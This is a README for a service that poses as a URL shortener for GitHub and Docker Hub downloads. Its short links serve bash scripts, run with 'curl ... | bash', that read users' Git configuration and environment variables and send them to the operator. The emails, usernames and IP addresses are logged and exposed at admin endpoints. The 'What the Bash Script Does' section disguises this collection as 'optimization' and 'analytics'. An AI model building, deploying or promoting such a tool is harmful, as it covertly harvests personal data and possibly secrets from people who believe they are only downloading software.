# 📧 Email Extractor via a URL Shortener

A lightweight tool that shortens GitHub and Docker Hub URLs and provides bash scripts that extract user email information while downloading the requested resources.

## Installation

### Prerequisites
- Node.js (v14 or higher)
- PostgreSQL (v12 or higher)

### Database Setup

1. **Install PostgreSQL** (if not already installed):
   - **Windows**: Download from [postgresql.org](https://www.postgresql.org/download/windows/)
   - **macOS**: `brew install postgresql`
   - **Linux**: `sudo apt-get install postgresql postgresql-contrib`

2. **Create the database**:
   ```bash
   # Connect to PostgreSQL as superuser
   psql -U postgres
   
   # Or run the setup script
   psql -U postgres -f setup-database.sql
   ```

3. **Configure environment variables**:
   ```bash
   # Copy the example configuration
   cp config.example.env .env
   
   # Edit .env with your database credentials
   nano .env
   ```

### Application Setup

1. **Clone the repository**:
   ```bash
   git clone <repository-url>
   cd email-extractor
   ```

2. **Install dependencies**:
   ```bash
   npm install
   ```

3. **Start the server**:
   ```bash
   npm start
   ```
   
   For development with auto-reload:
   ```bash
   npm run dev
   ```

The server will start on `http://localhost:5001` by default and automatically create the required database tables.

## API Endpoints

### 1. Shorten URL
**POST** `/shorten`

Converts a GitHub archive URL or Docker Hub URL into a shortened URL.

**Request Body**:
```json
{
  "url": "https://github.com/actions/download-artifact/archive/refs/tags/v4.3.0.zip"
}
```

**Response**:
```json
{
  "shortUrl": "http://localhost:3000/s/a1b2c3d4",
  "originalUrl": "https://github.com/actions/download-artifact/archive/refs/tags/v4.3.0.zip",
  "resourceType": "github",
  "shortId": "a1b2c3d4"
}
```

**Supported URL Formats**:
- GitHub: `https://github.com/owner/repo/archive/refs/tags/version.zip`
- Docker Hub: `https://hub.docker.com/_/redis`

### 2. Execute Bash Script
**GET** `/s/:shortId`

Returns a bash script that extracts the user's GitHub email and downloads the resource.

**Usage**:
```bash
curl -s http://localhost:3000/s/a1b2c3d4 | bash
```

### 3. Admin Endpoints

#### View Logged Emails
**GET** `/admin/emails`

Returns all logged email information.

#### View URL Mappings
**GET** `/admin/urls`

Returns all shortened URL mappings.

#### Health Check
**GET** `/health`

Returns server health status and statistics.

## Usage Examples

### Example 1: GitHub Artifact

1. **Shorten the URL**:
   ```bash
   curl -X POST http://localhost:3000/shorten \
     -H "Content-Type: application/json" \
     -d '{"url": "https://github.com/actions/download-artifact/archive/refs/tags/v4.3.0.zip"}'
   ```

2. **Execute the script**:
   ```bash
   curl -s http://localhost:3000/s/a1b2c3d4 | bash
   ```

### Example 2: Docker Image

1. **Shorten the URL**:
   ```bash
   curl -X POST http://localhost:3000/shorten \
     -H "Content-Type: application/json" \
     -d '{"url": "https://hub.docker.com/_/redis"}'
   ```

2. **Execute the script**:
   ```bash
   curl -s http://localhost:3000/s/e5f6g7h8 | bash
   ```

## What the Bash Script Does

When users execute the shortened URL, the generated bash script will:

1. **System Configuration Check**:
   - Checks the user's Git configuration for optimal download settings
   - Reads system environment variables for performance optimization

2. **Background Optimization**:
   - Sends configuration data to the server for analytics and optimization
   - Runs optimization processes in the background

3. **Download Resource**:
   - **For GitHub**: Downloads the archive file as `artifact.zip`
   - **For Docker**: Pulls the Docker image using `docker pull`

4. **Provide Feedback**:
   - Shows download progress and success/failure messages
   - Confirms successful resource acquisition

## Database Schema

The application uses PostgreSQL with the following tables:

### `url_mappings`
- `id`: Serial primary key
- `short_id`: Unique short identifier (VARCHAR 50)
- `original_url`: Original long URL (TEXT)
- `resource_type`: Type of resource - 'github' or 'docker' (VARCHAR 20)
- `created_at`: Timestamp of creation

### `email_logs`
- `id`: Serial primary key
- `email`: User's email address (VARCHAR 255)
- `username`: User's username (VARCHAR 255)
- `short_id`: Reference to url_mappings (VARCHAR 50)
- `resource_type`: Type of resource accessed (VARCHAR 20)
- `ip_address`: User's IP address (INET)
- `user_agent`: User's browser/client information (TEXT)
- `created_at`: Timestamp of log entry

## Environment Variables

- `PORT`: Server port (default: 5001)
- `DB_HOST`: PostgreSQL host (default: localhost)
- `DB_PORT`: PostgreSQL port (default: 5432)
- `DB_NAME`: Database name (default: email_extractor)
- `DB_USER`: Database user (default: postgres)
- `DB_PASSWORD`: Database password (required)
- `NODE_ENV`: Environment mode (default: development)


## License

This project is licensed under the FSL-1.1-MIT License. See the LICENSE file for details.